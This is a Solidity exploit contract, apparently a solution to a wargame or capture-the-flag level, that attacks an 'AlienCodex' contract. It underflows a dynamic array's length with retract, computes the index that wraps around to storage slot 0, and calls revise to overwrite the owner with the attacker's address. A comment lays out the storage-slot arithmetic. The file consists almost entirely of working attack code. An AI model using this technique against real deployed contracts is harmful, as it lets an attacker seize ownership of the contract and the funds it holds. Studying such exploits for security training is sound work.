// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IAlienCodex {
    function owner() external view returns (address);
    function retract() external;
    function make_contact() external;
    function revise(uint256 i, bytes32 _content) external;
}
//0x35308bf40f3C47fC988F540eEa9E1Aa8f9C8Fe86
contract Hack {
    /*
    storage
    slot 0 - owner (20 bytes), contact (1 byte)
    slot 1 - length of the array codex

    // slot where array element is stored = keccak256(slot)) + index
    // h = keccak256(1)
    slot h + 0 - codex[0] 
    slot h + 1 - codex[1] 
    slot h + 2 - codex[2] 
    slot h + 3 - codex[3] 

    slot h + i = slot 0
    h + i = 0 so i = 0 - h
    */
    constructor(IAlienCodex target) {
        target.make_contact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            i -= h;
        }

        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "hack failed");
    }
}